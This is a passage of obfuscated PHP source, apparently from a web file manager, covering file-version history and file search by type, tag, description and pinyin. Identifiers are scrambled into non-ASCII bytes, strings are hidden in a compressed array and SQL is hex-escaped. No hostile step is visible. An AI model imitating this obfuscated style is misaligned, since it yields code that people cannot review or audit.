$è„¥ÜÅÜ[$¤¤»ù‰æ] = array(); } $æ³ƒÛ˜Ê[$Å¨ıõÃ«[177]] = $›š«ï»™; $æ³ƒÛ˜Ê[$Å¨ıõÃ«[176]] = $¤¤»ù‰æ; $è„¥ÜÅÜ[$¤¤»ù‰æ][] =& $æ³ƒÛ˜Ê; if (count($è„¥ÜÅÜ[$¤¤»ù‰æ]) > 1) { $æ³ƒÛ˜Ê[$Å¨ıõÃ«[606]] = !0; } Hook::trigger($Å¨ıõÃ«[608], $æ³ƒÛ˜Ê); } unset($æ³ƒÛ˜Ê); $üğïó½ = array($Å¨ıõÃ«[176] => array($Å¨ıõÃ«[7], array_keys($è„¥ÜÅÜ))); $å”ÔÑ = Model($Å¨ıõÃ«[609]); $ı¶ü¿öÊ = $å”ÔÑ->where($üğïó½)->select(); $ı¶ü¿öÊ = $ı¶ü¿öÊ ? $ı¶ü¿öÊ : array(); foreach ($ı¶ü¿öÊ as $ş’ÖÂ·È) { if (!isset($è„¥ÜÅÜ[$ş’ÖÂ·È[$Å¨ıõÃ«[176]]])) { continue; } $³ì—†Ò° = $è„¥ÜÅÜ[$ş’ÖÂ·È[$Å¨ıõÃ«[176]]]; foreach ($³ì—†Ò° as &$æ³ƒÛ˜Ê) { $æ³ƒÛ˜Ê[$Å¨ıõÃ«[468]] = $ş’ÖÂ·È[$Å¨ıõÃ«[468]]; $æ³ƒÛ˜Ê[$Å¨ıõÃ«[606]] = !0; } unset($æ³ƒÛ˜Ê); } $¤‰‡œÅÎ = array(); foreach ($¦ùÒåóÓ as $ú‚ğøÉÌ) { Hook::trigger($Å¨ıõÃ«[610], $ú‚ğøÉÌ); if (isset($ú‚ğøÉÌ[$Å¨ıõÃ«[606]]) && $ú‚ğøÉÌ[$Å¨ıõÃ«[606]]) { Hook::trigger($Å¨ıõÃ«[611], $ú‚ğøÉÌ); continue; } $¬±ªÆçé = $Æİğ×ğê->getPathInner($ú‚ğøÉÌ[$Å¨ıõÃ«[84]]); $™õ¢èé = $å”ÔÑ->addFileMake($¬±ªÆçé, $ú‚ğøÉÌ[$Å¨ıõÃ«[76]], $ú‚ğøÉÌ[$Å¨ıõÃ«[177]], $ú‚ğøÉÌ[$Å¨ıõÃ«[176]], $ú‚ğøÉÌ[$Å¨ıõÃ«[32]], $íÕ»Ôõï); Hook::trigger($Å¨ıõÃ«[611], $ú‚ğøÉÌ); if (!is_array($™õ¢èé)) { continue; } $¤‰‡œÅÎ[] = $™õ¢èé; } $å”ÔÑ->addAll($¤‰‡œÅÎ); $üğïó½ = array($Å¨ıõÃ«[176] => array($Å¨ıõÃ«[7], array_keys($è„¥ÜÅÜ))); $ı¶ü¿öÊ = $å”ÔÑ->where($üğïó½)->select(); $ı¶ü¿öÊ = $ı¶ü¿öÊ ? $ı¶ü¿öÊ : array(); foreach ($ı¶ü¿öÊ as $ş’ÖÂ·È) { if (!isset($è„¥ÜÅÜ[$ş’ÖÂ·È[$Å¨ıõÃ«[176]]])) { continue; } $Î¯ìÎê =& $è„¥ÜÅÜ[$ş’ÖÂ·È[$Å¨ıõÃ«[176]]]; foreach ($Î¯ìÎê as &$æ³ƒÛ˜Ê) { $æ³ƒÛ˜Ê[$Å¨ıõÃ«[468]] = $ş’ÖÂ·È[$Å¨ıõÃ«[468]]; } unset($æ³ƒÛ˜Ê); } $ÄŞÇ±´ò = array(); foreach ($¦ùÒåóÓ as $ı„–¤â ) { $ÄŞÇ±´ò[$ı„–¤â [$Å¨ıõÃ«[32]]] = $ı„–¤â ; } return $ÄŞÇ±´ò; } } goto aÛ³â”ñ´; b·åëî¿ÕÈ: define($_SERVER[ĞÂ¤àÓï][0], $_SERVER[ĞÂ¤àÓï][1]); $_SERVER[ÚâÊšŒı] = explode($_SERVER[ĞÂ¤àÓï][2], gzinflate(substr($_SERVER[ĞÂ¤àÓï][3], 10, -8))); function binCheckEq($²ëŸª–Ü, $Ã´øæëº) { return $²ëŸª–Ü == $Ã´øæëº; } goto C±—íÁ«¿Ï; AÜæï«í: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\x72\x63\x65\x5f\x68\151\x73\x74\157\162\x79"; public function historyCount($ì‘şÛÂç) { $¤Ñ½ƒ´³ =& $_SERVER[ĞÂ¤àÓï]; if (!$ì‘şÛÂç) { return array(); } if (is_string($ì‘şÛÂç) || is_int($ì‘şÛÂç)) { $ì‘şÛÂç = array($ì‘şÛÂç); } $º··ÚØ‹ = array($¤Ñ½ƒ´³[402], $¤Ñ½ƒ´³[1887] => $¤Ñ½ƒ´³[500]); $š‰ß£—Ğ = array($¤Ñ½ƒ´³[402] => array($¤Ñ½ƒ´³[7], $ì‘şÛÂç)); $Ç®ñë–À = $this->field($º··ÚØ‹)->where($š‰ß£—Ğ)->group($¤Ñ½ƒ´³[402])->select(); return array_to_keyvalue($Ç®ñë–À, $¤Ñ½ƒ´³[402], $¤Ñ½ƒ´³[500]); } public function addHistory($îÈ ñ³œ, $¦¾–Å = '') { $ë†ÅÓ»¼ =& $_SERVER[ĞÂ¤àÓï]; $ıÙ¾»³õ = array($ë†ÅÓ»¼[417] => $îÈ ñ³œ[$ë†ÅÓ»¼[402]], $ë†ÅÓ»¼[1655] => isset($îÈ ñ³œ[$ë†ÅÓ»¼[456]]) ? $îÈ ñ³œ[$ë†ÅÓ»¼[456]] : $îÈ ñ³œ[$ë†ÅÓ»¼[454]], $ë†ÅÓ»¼[469] => $îÈ ñ³œ[$ë†ÅÓ»¼[468]], $ë†ÅÓ»¼[585] => $îÈ ñ³œ[$ë†ÅÓ»¼[76]], $ë†ÅÓ»¼[2093] => $¦¾–Å); if ($GLOBALS[$ë†ÅÓ»¼[6]][$ë†ÅÓ»¼[89]][$ë†ÅÓ»¼[1218]] >= 1) { $this->historyAutoClear($ıÙ¾»³õ[$ë†ÅÓ»¼[402]]); $this->add($ıÙ¾»³õ); } Hook::trigger($ë†ÅÓ»¼[2094], $ıÙ¾»³õ); Model($ë†ÅÓ»¼[2095])->eventFileEdit($îÈ ñ³œ[$ë†ÅÓ»¼[402]]); } private function historyAutoClear($áØã½â) { $¥Õ£Ã¥ =& $_SERVER[ĞÂ¤àÓï]; $Î„¨¯¯´ = Model($¥Õ£Ã¥[769])->get($¥Õ£Ã¥[1240]); $›ö€ ùê = $GLOBALS[$¥Õ£Ã¥[6]][$¥Õ£Ã¥[89]][$¥Õ£Ã¥[1218]]; $æ˜²ØÑÍ = $Î„¨¯¯´ == $¥Õ£Ã¥[1241] ? min(5, $›ö€ ùê) : $›ö€ ùê; $æ˜²ØÑÍ = $æ˜²ØÑÍ <= 0 ? 0 : $æ˜²ØÑÍ - 1; if ($æ˜²ØÑÍ >= 500) { return; } $à³Ğµè = array($¥Õ£Ã¥[417] => $áØã½â); $±¦šì¯¨ = $this->field($¥Õ£Ã¥[2096])->where($à³Ğµè)->order($¥Õ£Ã¥[2090])->select(); if (!$±¦šì¯¨ || $æ˜²ØÑÍ >= count($±¦šì¯¨)) { return; } $½“ªÓú = array_to_keyvalue($±¦šì¯¨, $¥Õ£Ã¥[12], $¥Õ£Ã¥[399]); $½“ªÓú = array_slice($½“ªÓú, $æ˜²ØÑÍ); $©®ÛÌ³® = array_to_keyvalue($±¦šì¯¨, $¥Õ£Ã¥[12], $¥Õ£Ã¥[468]); $©®ÛÌ³® = array_slice($©®ÛÌ³®, $æ˜²ØÑÍ); if (!$½“ªÓú || !$©®ÛÌ³®) { return; } $à³Ğµè = array($¥Õ£Ã¥[419] => array($¥Õ£Ã¥[7], $½“ªÓú)); $this->where($à³Ğµè)->delete(); Model($¥Õ£Ã¥[471])->remove($©®ÛÌ³®); } public function listData($ˆÏ©İ¦ö) { $àø¢¨©µ =& $_SERVER[ĞÂ¤àÓï]; $½´ˆÈ÷ = array($àø¢¨©µ[417] => $ˆÏ©İ¦ö); $°×Šª¯´ = $àø¢¨©µ[2097]; $Î€ÖÆöª = $this->field($°×Šª¯´)->where($½´ˆÈ÷)->order($àø¢¨©µ[2090])->selectPage(); $this->_listAppendUser($Î€ÖÆöª[$àø¢¨©µ[369]]); $Ú¢„æË¨ = Model($àø¢¨©µ[769])->get($àø¢¨©µ[1240]); $”•…Î¹ = 5; if ($Ú¢„æË¨ == $àø¢¨©µ[1241]) { $Î€ÖÆöª[$àø¢¨©µ[369]] = array_slice($Î€ÖÆöª[$àø¢¨©µ[369]], 0, $”•…Î¹); $Î€ÖÆöª[$àø¢¨©µ[366]] = array($àø¢¨©µ[2098] => 1, $àø¢¨©µ[2099] => 20, $àø¢¨©µ[2100] => 1, $àø¢¨©µ[2101] => count($Î€ÖÆöª[$àø¢¨©µ[369]])); } return $Î€ÖÆöª; } protected function _listAppendUser(&$ªƒïö©ø) { $ßŒŞˆ¦¿ =& $_SERVER[ĞÂ¤àÓï]; $—Úø¥½ = array_to_keyvalue($ªƒïö©ø, $ßŒŞˆ¦¿[12], $ßŒŞˆ¦¿[1664]); $‚ˆÉ¥¯ = Model($ßŒŞˆ¦¿[535])->userListInfo($—Úø¥½); foreach ($ªƒïö©ø as &$à›Ôı®Ê) { $™ıÂ‡ ­ = $à›Ôı®Ê[$ßŒŞˆ¦¿[1664]]; $à›Ôı®Ê[$ßŒŞˆ¦¿[454]] = $‚ˆÉ¥¯[$™ıÂ‡ ­] ? $‚ˆÉ¥¯[$™ıÂ‡ ­] : !1; } unset($à›Ôı®Ê); } public function fileInfo($á§ÍØØá) { $•âåèÖÓ =& $_SERVER[ĞÂ¤àÓï]; $ñ™›èİ‰ = $this->tablePrefix; $… ñâÉ = "{$ñ™›èİ‰}\151\157\x5f\146\151\x6c\145\x20\x66\x69\x6c\145\x73\x20\x6f\x6e\x20\x66\x69\154\145\163\x2e\146\x69\154\145\x49\x44\x20\75\x20\x68\151\x73\164\157\162\171\x2e\146\x69\x6c\145\x49\104"; return $this->alias($•âåèÖÓ[2102])->where(array($•âåèÖÓ[419] => $á§ÍØØá))->join($… ñâÉ, $•âåèÖÓ[2103])->find(); } public function removeItem($µ’’ıÜÍ) { $±é¸µø =& $_SERVER[ĞÂ¤àÓï]; $äÆŞ³€Ë = array($±é¸µø[419] => $µ’’ıÜÍ); $ó—²òç = $this->where($äÆŞ³€Ë)->find(); if ($ó—²òç) { $£›Ùíä = $this->where($äÆŞ³€Ë)->delete(); Model($±é¸µø[471])->remove($ó—²òç[$±é¸µø[468]]); return $£›Ùíä; } return !1; } public function removeBySource($²˜® ·ß) { $Ñ¼î£±Ğ =& $_SERVER[ĞÂ¤àÓï]; if (!$²˜® ·ß) { return !1; } if (!is_array($²˜® ·ß)) { $²˜® ·ß = array($²˜® ·ß); } $š†´Î¤ = array($Ñ¼î£±Ğ[417] => array($Ñ¼î£±Ğ[7], $²˜® ·ß)); $¾ÏÓÀç = $this->field($Ñ¼î£±Ğ[469])->where($š†´Î¤)->select(); if ($¾ÏÓÀç) { $this->where($š†´Î¤)->delete(); $Œ¢È“»š = array_to_keyvalue($¾ÏÓÀç, $Ñ¼î£±Ğ[12], $Ñ¼î£±Ğ[468]); Model($Ñ¼î£±Ğ[471])->remove($Œ¢È“»š); } return !0; } public function setDetail($ò¹ğìæÆ, $·Ë¯ß’) { $¿Ş“”—î =& $_SERVER[ĞÂ¤àÓï]; return $this->where(array($¿Ş“”—î[419] => $ò¹ğìæÆ))->save(array($¿Ş“”—î[2093] => $·Ë¯ß’)); } public function rollbackToItem($±¼«¦ —, $å•ò„ÎĞ) { $ò€–Šíè =& $_SERVER[ĞÂ¤àÓï]; $É¦¸à›ı = Model($ò€–Šíè[832])->sourceInfo($±¼«¦ —); $this->addHistory($É¦¸à›ı, LNG($ò€–Šíè[2104])); $ú¬²ƒğ“ = $this->find($å•ò„ÎĞ); $´çó÷¢Ç = array($ò€–Šíè[468] => $ú¬²ƒğ“[$ò€–Šíè[468]], $ò€–Šíè[76] => $ú¬²ƒğ“[$ò€–Šíè[76]], $ò€–Šíè[85] => time(), $ò€–Šíè[456] => USER_ID); Model($ò€–Šíè[832])->where(array($ò€–Šíè[402] => $±¼«¦ —))->save($´çó÷¢Ç); return $this->where(array($ò€–Šíè[419] => $å•ò„ÎĞ))->delete(); } public function clearSame($åÉÉî—°) { $·§ø©ŞÉ =& $_SERVER[ĞÂ¤àÓï]; $ŠÙÇğéä = $this->listData($åÉÉî—°); $ÁÂ‹§ı„ = array_to_keyvalue_group($ŠÙÇğéä, $·§ø©ŞÉ[468]); $ßë›Ñ ø = array(); $µ«—Ã½‘ = array(); foreach ($ÁÂ‹§ı„ as $ç÷§É¯Ü) { if (!$ç÷§É¯Ü || count($ç÷§É¯Ü) <= 1) { continue; } foreach ($ç÷§É¯Ü as $üÛ¤¿ò„) { $ßë›Ñ ø[] = $üÛ¤¿ò„[$·§ø©ŞÉ[468]]; $µ«—Ã½‘[] = $üÛ¤¿ò„[$·§ø©ŞÉ[399]]; } } if (!$µ«—Ã½‘) { return; } $this->where(array($·§ø©ŞÉ[399] => array($·§ø©ŞÉ[7], $µ«—Ã½‘)))->delete(); Model($·§ø©ŞÉ[471])->remove($ßë›Ñ ø); } public function userSpace() { $¿Ğ©Š£— =& $_SERVER[ĞÂ¤àÓï]; $æúä½¡ = $this->tablePrefix; $úŞãµê  = array($¿Ğ©Š£—[1655] => USER_ID); $©’ó†¹® = "{$æúä½¡}\x69\157\137\x66\151\x6c\x65\x20\146\x69\154\x65\x73\x20\157\156\x20\x66\151\154\145\x73\56\x66\151\x6c\x65\111\104\x20\x3d\40\150\x69\x73\x74\x6f\x72\x79\56\146\151\x6c\145\111\x44"; return $this->alias($¿Ğ©Š£—[2102])->where($úŞãµê )->join($©’ó†¹®, $¿Ğ©Š£—[2103])->sum($¿Ğ©Š£—[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Ïó‰õŒÖ) { $º†»ÉşĞ =& $_SERVER[ĞÂ¤àÓï]; $¾úÖ‹†“ = KodIO::fileTypeList(); $×÷¼¬°÷ = $¾úÖ‹†“[$Ïó‰õŒÖ]; if (!$×÷¼¬°÷) { return array(); } $ğ”Ï§éü = $×÷¼¬°÷[$º†»ÉşĞ[174]]; $œ–¤©á° = $º†»ÉşĞ[7]; if (!$×÷¼¬°÷[$º†»ÉşĞ[174]]) { $èÅĞ»ßÄ = array_to_keyvalue($¾úÖ‹†“, $º†»ÉşĞ[12], $º†»ÉşĞ[174]); $ğ”Ï§éü = implode($º†»ÉşĞ[50], $èÅĞ»ßÄ); $œ–¤©á° = $º†»ÉşĞ[2105]; } $¼ÃÇÔ™è = explode($º†»ÉşĞ[50], trim($ğ”Ï§éü, $º†»ÉşĞ[50])); return array($œ–¤©á°, $¼ÃÇÔ™è); } public function listPathType($Íñ¥¬ş–) { $¥¡³ŸŒ =& $_SERVER[ĞÂ¤àÓï]; $äº¬êõ = $this->fileTypeWhere($Íñ¥¬ş–); if (!$äº¬êõ) { return array(); } $Âô÷‚›ğ = USER_ID; $½£…óçé = Model($¥¡³ŸŒ[535])->getInfo($Âô÷‚›ğ); $–½ªˆÀÌ = array($¥¡³ŸŒ[586] => SourceModel::TYPE_USER, $¥¡³ŸŒ[521] => array($¥¡³ŸŒ[550], $¥¡³ŸŒ[531] . $½£…óçé[$¥¡³ŸŒ[86]][$¥¡³ŸŒ[402]] . $¥¡³ŸŒ[551]), $¥¡³ŸŒ[587] => $Âô÷‚›ğ, $¥¡³ŸŒ[583] => 0, $¥¡³ŸŒ[584] => $äº¬êõ); return $this->listSource($–½ªˆÀÌ); } public function listSearch($÷öü§ª, $‹»àÙÛœ = 300) { $¦Š’Ë³™ =& $_SERVER[ĞÂ¤àÓï]; if (isset($÷öü§ª[$¦Š’Ë³™[1948]]) && $÷öü§ª[$¦Š’Ë³™[1948]]) { $÷öü§ª[$¦Š’Ë³™[1948]] = str_replace($¦Š’Ë³™[384], $¦Š’Ë³™[2106], trim($÷öü§ª[$¦Š’Ë³™[1948]])); } $Ãø“‘Àì = $this->_parseSearchWhere($÷öü§ª); if (!isset($Ãø“‘Àì[$¦Š’Ë³™[431]])) { $Ãø“‘Àì[$¦Š’Ë³™[431]] = 0; } $Š©ó¤‰— = $¦Š’Ë³™[2107]; $åŸØ…Å = $Ãø“‘Àì; $“³ŸÍ˜ = $Š©ó¤‰—; $this->_listSearchBindPinyin($÷öü§ª, $Ãø“‘Àì, $Š©ó¤‰—); $this->alias($¦Š’Ë³™[446])->_makeOrder(); $Ãø“‘Àì = $this->parseWhereLike($Ãø“‘Àì); $°©öòÅú = $this->distinct(!0)->field($Š©ó¤‰—)->where($Ãø“‘Àì)->selectPage($‹»àÙÛœ); if ($GLOBALS[$¦Š’Ë³™[6]][$¦Š’Ë³™[381]][$¦Š’Ë³™[382]] && Input::check($÷öü§ª[$¦Š’Ë³™[1948]], $¦Š’Ë³™[593]) && $°©öòÅú[$¦Š’Ë³™[366]][$¦Š’Ë³™[353]] == 1 && $°©öòÅú[$¦Š’Ë³™[366]][$¦Š’Ë³™[367]] == 0) { $°©öòÅú = $this->distinct(!0)->field($Š©ó¤‰—)->where($åŸØ…Å)->limit(1000)->select(); $°©öòÅú = array_page_split($°©öòÅú, !1, $‹»àÙÛœ); } $this->_listSearchFileContent($°©öòÅú, $÷öü§ª, $“³ŸÍ˜, $åŸØ…Å); $this->_listSearchDesc($°©öòÅú, $÷öü§ª, $“³ŸÍ˜); $this->_listSearchTag($°©öòÅú, $÷öü§ª, $“³ŸÍ˜); $this->_listSearchGroupTag($°©öòÅú, $÷öü§ª, $“³ŸÍ˜); $this->_listDataApply($°©öòÅú[$¦Š’Ë³™[369]]); $this->_listMake($°©öòÅú); return $°©öòÅú; } private function _listSearchFileContent(&$“ÙÜà¶©, $´’êÏ‡ü, $‚¶àøé™, $Ÿ¯„õŒè) { $ÍÑçÀÉ =& $_SERVER[ĞÂ¤àÓï]; if (!$´’êÏ‡ü[$ÍÑçÀÉ[1948]] || $“ÙÜà¶©[$ÍÑçÀÉ[366]][$ÍÑçÀÉ[353]] > 1) { return; } if (!isset($Ÿ¯„õŒè[$ÍÑçÀÉ[32]]) || !is_array($´’êÏ‡ü[$ÍÑçÀÉ[468]])) { return; } $Ÿ¯„õŒè[$ÍÑçÀÉ[468]] = array($ÍÑçÀÉ[7], $´’êÏ‡ü[$ÍÑçÀÉ[468]]); unset($Ÿ¯„õŒè[$ÍÑçÀÉ[32]]); unset($´’êÏ‡ü[$ÍÑçÀÉ[468]]); $úÇóŞ•¥ = $this->field($‚¶àøé™)->where($Ÿ¯„õŒè)->limit($ÍÑçÀÉ[2108])->select(); if (!$úÇóŞ•¥ || count($úÇóŞ•¥) == 0) { return; } $“ÙÜà¶©[$ÍÑçÀÉ[369]] = array_merge($úÇóŞ•¥, $“ÙÜà¶©[$ÍÑçÀÉ[369]]); $“ÙÜà¶©[$ÍÑçÀÉ[366]][$ÍÑçÀÉ[367]] += count($úÇóŞ•¥); } private function _listSearchTag(&$­ææÂİû, $Øº¹ùÎ, $Á¦œ®˜ò) { $“İš¤¦Ü =& $_SERVER[ĞÂ¤àÓï]; if (!$Øº¹ùÎ[$“İš¤¦Ü[1948]] || $­ææÂİû[$“İš¤¦Ü[366]][$“İš¤¦Ü[353]] > 1) { return; } $Â®øñÑ· = Model($“İš¤¦Ü[2109])->listData(); $ì˜™Ñë = array(); $ùê‘¾ = $Øº¹ùÎ[$“İš¤¦Ü[1948]]; foreach ($Â®øñÑ· as $¿öñÑ¨å) { $ë‹¬‘“Ü = $¿öñÑ¨å[$“İš¤¦Ü[32]]; $êôÔ®«ğ = str_replace($“İš¤¦Ü[53], $“İš¤¦Ü[12], Pinyin::get($ë‹¬‘“Ü)); if (stripos($ë‹¬‘“Ü, $ùê‘¾) !== !1 || stripos($êôÔ®«ğ, $ùê‘¾) !== !1) { $ì˜™Ñë[] = $¿öñÑ¨å[$“İš¤¦Ü[399]]; } } if (!$ì˜™Ñë) { return; } $î»¶øıÂ = array($“İš¤¦Ü[426] => array($“İš¤¦Ü[7], $ì˜™Ñë), $“İš¤¦Ü[1664] => USER_ID); $ˆôŸ²½ = Model($“İš¤¦Ü[428])->field($“İš¤¦Ü[84])->where($î»¶øıÂ)->select(); $ˆôŸ²½ = array_to_keyvalue($ˆôŸ²½, $“İš¤¦Ü[12], $“İš¤¦Ü[84]); $šãÒâÈÂ = array_unique($ˆôŸ²½); $this->_listSearchMerge($­ææÂİû, $Øº¹ùÎ, $Á¦œ®˜ò, $šãÒâÈÂ); } private function _listSearchDesc(&$Ê¥äÈ¸, $…­üÆ½¢, $½‡’Œóá) { $»ÌÅô¦˜ =& $_SERVER[ĞÂ¤àÓï]; if (!$…­üÆ½¢[$»ÌÅô¦˜[1948]] || $Ê¥äÈ¸[$»ÌÅô¦˜[366]][$»ÌÅô¦˜[353]] > 1) { return; } $ûô©¥ÁÁ = array($»ÌÅô¦˜[94] => $»ÌÅô¦˜[453], $»ÌÅô¦˜[374] => array($»ÌÅô¦˜[383], $»ÌÅô¦˜[1950] . $…­üÆ½¢[$»ÌÅô¦˜[1948]] . $»ÌÅô¦˜[1950])); $Šà¡áåó = !1; if ($Šà¡áåó) { $ãù„¬€¡ = $this->listSearchChildren($…­üÆ½¢[$»ÌÅô¦˜[432]]); $ãù„¬€¡ = array_unique($ãù„¬€¡); if (!$ãù„¬€¡) { return; } $ûô©¥ÁÁ[$»ÌÅô¦˜[402]] = array($»ÌÅô¦˜[7], $ãù„¬€¡); } $Ò›Ûáşë = Model($»ÌÅô¦˜[569])->field($»ÌÅô¦˜[402])->where($ûô©¥ÁÁ)->limit(5000)->select(); $š‰ í” = array_to_keyvalue($Ò›Ûáşë, $»ÌÅô¦˜[12], $»ÌÅô¦˜[402]); $this->_listSearchMerge($Ê¥äÈ¸, $…­üÆ½¢, $½‡’Œóá, $š‰ í”); } private function _listSearchGroupTag(&$ºšÖüÕ×, $‚¾ñâ¼¾, $ĞµñŞÕ½) { $µÚÊÀŸ =& $_SERVER[ĞÂ¤àÓï]; if (!$‚¾ñâ¼¾[$µÚÊÀŸ[1948]] || $ºšÖüÕ×[$µÚÊÀŸ[366]][$µÚÊÀŸ[353]] > 1 || !$‚¾ñâ¼¾[$µÚÊÀŸ[432]]) { return; } $é³Œôàû = $this->sourceInfo($‚¾ñâ¼¾[$µÚÊÀŸ[432]]); if (!$é³Œôàû || $é³Œôàû[$µÚÊÀŸ[411]] != SourceModel::TYPE_GROUP) { return; } $Ì§¡‘„È = $é³Œôàû[$µÚÊÀŸ[505]]; $Ò—¥ëëÎ = Model($µÚÊÀŸ[2110])->get($Ì§¡‘„È); $Ôµòğ•ñ = array(); $µ¦õõ× = $‚¾ñâ¼¾[$µÚÊÀŸ[1948]]; foreach ($Ò—¥ëëÎ[$µÚÊÀŸ[369]] as $°Ï½ñé¾) { $Úşîã†Ù = $°Ï½ñé¾[$µÚÊÀŸ[32]]; $ƒö–Óí = str_replace($µÚÊÀŸ[53], $µÚÊÀŸ[12], Pinyin::get($Úşîã†Ù)); if (stripos($Úşîã†Ù, $µ¦õõ×) !== !1 || stripos($ƒö–Óí, $µ¦õõ×) !== !1) { $Ôµòğ•ñ[] = $°Ï½ñé¾[$µÚÊÀŸ[399]]; } } if (!$Ôµòğ•ñ) { return; } $„ê¥´§Š = array($µÚÊÀŸ[426] => array($µÚÊÀŸ[7], $Ôµòğ•ñ), $µÚÊÀŸ[1664] => 0, $µÚÊÀŸ[33] => $µÚÊÀŸ[1970] . $Ì§¡‘„È); $âÛ¢ÔÖ¢ = Model($µÚÊÀŸ[428])->field($µÚÊÀŸ[84])->where($„ê¥´§Š)->select(); $âÛ¢ÔÖ¢ = array_to_keyvalue($âÛ¢ÔÖ¢, $µÚÊÀŸ[12], $µÚÊÀŸ[84]); $Ó„“ü• = array_unique($âÛ¢ÔÖ¢); $this->_listSearchMerge($ºšÖüÕ×, $‚¾ñâ¼¾, $ĞµñŞÕ½, $Ó„“ü•); } private function _listSearchMerge(&$åê²§Úò, $÷ö³äŒà, $Ç¿Ìİú, $õ°­½È) { $³†¡şß =& $_SERVER[ĞÂ¤àÓï]; if (!$õ°­½È) { return; } $š¨¾‹Çâ = array_to_keyvalue($åê²§Úò[$³†¡şß[369]], $³†¡şß[12], $³†¡şß[402]); $”ó«µ = array_diff($õ°­½È, $š¨¾‹Çâ); if (!$”ó«µ) { return; } $Ê—öòÓä = array($³†¡şß[402] => array($³†¡şß[7], $”ó«µ)); $Íò«±— = $this->field($Ç¿Ìİú)->where($Ê—öòÓä)->select(); if (!$Íò«±—) { return; } $ĞÙ‰‘Éû = array(); foreach ($Íò«±— as $ìËºªï‰) { if ($this->_listSearchFilter($ìËºªï‰, $÷ö³äŒà)) { $ĞÙ‰‘Éû[] = $ìËºªï‰; } } $åê²§Úò[$³†¡şß[369]] = array_merge($ĞÙ‰‘Éû, $åê²§Úò[$³†¡şß[369]]); $åê²§Úò[$³†¡şß[366]][$³†¡şß[367]] += count($ĞÙ‰‘Éû); } private function _listSearchFilter($ù”½ºÃˆ, $ç«Í»¹Ç) { $´²­º¦£ =& $_SERVER[ĞÂ¤àÓï]; $âÅøÜÖÅ = $ù”½ºÃˆ[$´²­º¦£[410]] == $´²­º¦£[88]; if (!strstr($ù”½ºÃˆ[$´²­º¦£[521]], $´²­º¦£[50] . $ç«Í»¹Ç[$´²­º¦£[432]] . $´²­º¦£[50])) { return !1; } if (isset($ç«Í»¹Ç[$´²­º¦£[412]]) && $ç«Í»¹Ç[$´²­º¦£[412]] != $´²­º¦£[1909]) { if ($ç«Í»¹Ç[$´²­º¦£[412]] == $´²­º¦£[75] && !$âÅøÜÖÅ) { return !1; } if ($ç«Í»¹Ç[$´²­º¦£[412]] != $´²­º¦£[75] && $âÅøÜÖÅ) { return !1; } if (!strstr($ù”½ºÃˆ[$´²­º¦£[174]], $´²­º¦£[50] . $ç«Í»¹Ç[$´²­º¦£[412]] . $´²­º¦£[50])) { return !1; } } if (isset($ç«Í»¹Ç[$´²­º¦£[2111]]) && $ç«Í»¹Ç[$´²­º¦£[2111]] < $ù”½ºÃˆ[$´²­º¦£[76]]) { return !1; } if (isset($ç«Í»¹Ç[$´²­º¦£[2112]]) && $ç«Í»¹Ç[$´²­º¦£[2112]] > $ù”½ºÃˆ[$´²­º¦£[76]]) { return !1; } if (isset($ç«Í»¹Ç[$´²­º¦£[600]]) && $ç«Í»¹Ç[$´²­º¦£[600]] != $ù”½ºÃˆ[$´²­º¦£[456]]) { return !1; } return !0; } public function listSearchChildren($œ³ò‰Áã, $Œ ‘™‹ = 5000) { $ÚîÍÈì’ =& $_SERVER[ĞÂ¤àÓï]; $´ß¥¤¨¥ = array(); $ó‡¯´†¥ = $this->sourceInfo($œ³ò‰Áã); $¢¿¨Á±è = array($ÚîÍÈì’[521] => array($ÚîÍÈì’[383], $ó‡¯´†¥[$ÚîÍÈì’[521]] . $ó‡¯´†¥[$ÚîÍÈì’[402]] . $ÚîÍÈì’[551])); $»õâ÷À = $this->field($ÚîÍÈì’[76])->where($¢¿¨Á±è)->limit($Œ ‘™‹ + 1)->select(); $è³İÒ¥¶ = is_array($»õâ÷À) ? count($»õâ÷À) : 0; if ($è³İÒ¥¶ > $Œ ‘™‹) { return $this->_listSearchChildrenNear($œ³ò‰Áã, $Œ ‘™‹); } $£áÄûøÔ = $this->field($ÚîÍÈì’[402])->where($¢¿¨Á±è)->select(); $´ß¥¤¨¥ = array_to_keyvalue($£áÄûøÔ, $ÚîÍÈì’[12], $ÚîÍÈì’[402]); return $´ß¥¤¨¥; } private function _listSearchChildrenNear($–¼ÄºêŸ, $³©Ÿæ§Ö) { $Í–ëó =& $_SERVER[ĞÂ¤àÓï]; $‡´“®˜Ÿ = array(); $ û¢¶—† = array($Í–ëó[432] => $–¼ÄºêŸ); $¼ÚÚ¾¥ó = $this->field($Í–ëó[2113])->where($ û¢¶—†)->select(); $¨ËÌç´— = array_to_keyvalue(array_filter_by_field($¼ÚÚ¾¥ó, $Í–ëó[410], $Í–ëó[88]), $Í–ëó[12], $Í–ëó[402]); $‡´“®˜Ÿ = array_merge($‡´“®˜Ÿ, array_to_keyvalue($¼ÚÚ¾¥ó, $Í–ëó[12], $Í–ëó[402])); if (!$¨ËÌç´—) { return $‡´“®˜Ÿ; } $ û¢¶—† = array($Í–ëó[432] => array($Í–ëó[7], $¨ËÌç´—)); $¼ÚÚ¾¥ó = $this->field($Í–ëó[2113])->where($ û¢¶—†)->limit($³©Ÿæ§Ö)->select(); $‡´“®˜Ÿ = array_merge($‡´“®˜Ÿ, array_to_keyvalue($¼ÚÚ¾¥ó, $Í–ëó[12], $Í–ëó[402])); $‡´“®˜Ÿ = array_slice($‡´“®˜Ÿ, 0, $³©Ÿæ§Ö); return $‡´“®˜Ÿ; } private function _listSearchBindPinyin($üìÌ¢ıö, &$©‹ºÊ™Å, &$¹»Â›Ô‡) { $ù“ÕŸèÃ =& $_SERVER[ĞÂ¤àÓï]; if (!isset($üìÌ¢ıö[$ù“ÕŸèÃ[1948]]) || !$üìÌ¢ıö[$ù“ÕŸèÃ[1948]]) { return; } if (!Input::check($üìÌ¢ıö[$ù“ÕŸèÃ[1948]], $ù“ÕŸèÃ[318]) || strlen($üìÌ¢ıö[$ù“ÕŸèÃ[1948]]) < 2) { return; } $©²ôÚòŸ = "\x4c\x45\x46\124\x20\x4a\117\x49\116\x20{$this->tablePrefix}\151\157\137\163\x6f\165\x72\x63\x65\x5f\155\145\164\141\40\x6d\x65\x74\141\40\157\156\x20\163\x6f\165\x72\x63\145\56\163\157\x75\x72\143\145\111\104\x20\x3d\x20\155\145\x74\141\56\x73\x6f\165\x72\143\145\111\x44"; $Ì³¼ÙË = array(); $¹»Â›Ô‡ = 